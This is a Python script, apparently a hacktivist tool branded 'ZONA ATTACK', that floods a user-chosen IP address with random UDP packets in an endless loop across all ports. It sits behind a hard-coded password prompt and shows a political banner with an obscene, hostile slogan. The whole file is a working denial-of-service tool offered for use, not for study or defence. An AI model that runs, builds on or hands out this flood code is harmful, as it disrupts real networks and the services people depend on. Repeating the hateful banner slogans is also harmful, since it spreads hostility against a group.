# -*- coding: utf-8 -*-
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
#############

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'

attemps = 0
os.system("clear")
logo = """
    ▓▒▓▒▓▒░       ▓▒▓▒░       ▓▒▓▒▓▒░  ▓▒▓▒▓▒░     ▓▒▓▒▓▒░  
    ▓▒░   ▓▒░   ▓▒░   ▓▒░   ▓▒░        ▓▒░        ▓▒░    ▓▒░
    ▓▒░   ▓▒░  ▓▒░     ▓▒░  ▓▒░        ▓▒░              ▓▒░     
    ▓▒▓▒▓▒░    ▓▒░     ▓▒░    ▓▒▓▒▓▒░  ▓▒▓▒▓▒░       ▓▒░
    ▓▒░   ▓▒░  ▓▒░▓▒▓▒▓▒░          ▓▒░ ▓▒░              ▓▒░
    ▓▒░   ▓▒░  ▓▒░     ▓▒░         ▓▒░ ▓▒░        ▓▒     ▓▒░
    ▓▒▓▒▓▒░    ▓▒░     ▓▒░   ▓▒▓▒▓▒░   ▓▒▓▒▓▒░    ▓▒▓▒▓▒░
      ▒░▒░       ▒░     ▒░     ▒░▒░▒░     ▒░▒░       ▒░▒░▒░    
       ▒░         ░      ░       ░ ░        ░░           ░░



"""
faded_text = fade.fire(logo)
print(faded_text)
while attemps < 100:
    username = input('\033[33mEnter your username: \033[0m')
    password = input('\033[94mEnter your password: \033[0m')

    if username == 'kf99' and password == 'kf99':
        print('\033[32m***WELCOME TO ZONA ATTACK!!***\033[0m')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue


ip = str(input("\033[94mTarget IP :  \033[0m"))
port = int(input("\033[97mTarget Port :  \033[0m"))
threads = int(input("\033[92mThreads :  \033[0m"))
time.sleep(5),
print("\033[33m  ⟩⟩  BASE ADALAH... \033[0m "),
time.sleep(5),
print("\033[32m  ⟩⟩  SEKUMPULAN PEJUANG \033[0m "),
time.sleep(5),
print("\033[91m  ⟩⟩  YANG GERAM TERHADAP GENOSIDA \033[0m "),
time.sleep(5),
print("\033[98m  ⟩⟩  YANG DILAKUKAN BANGSA BAR-BAR \033[0m "),
time.sleep(5),
print("\033[96m  ⟩⟩  YANG MEMILIKI NAFSU MENGUASAI DUNIA \033[0m "),
time.sleep(5),
print("\033[95m  ⟩⟩  FUCK Z10N15..! \033[0m "),
time.sleep(5),

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(f"💥 \033[97m[\033[32mBASE-3\033[97m]  \033[33mMengakses  \033[92mWebs::::.... " +ip+ "\033[0m" )
     print(f"💥 \033[96m[\033[93mBASE-3\033[96m]  \033[95mMengirim  \033[96mPacket:::.... " +ip+ "\033[0m" )
     print(f"💥 \033[95m[\033[96mBASE-3\033[95m]  \033[94mMengikis  \033[32mThread:::.... " +ip+ "\033[0m" )
     print(f"💥 \033[91m[\033[94mBASE-3\033[91m]  \033[97mMelumpuhkan  \033[32mTarget::.. " +ip+ "\033[0m" )
     if port == 65534:
       port = 1
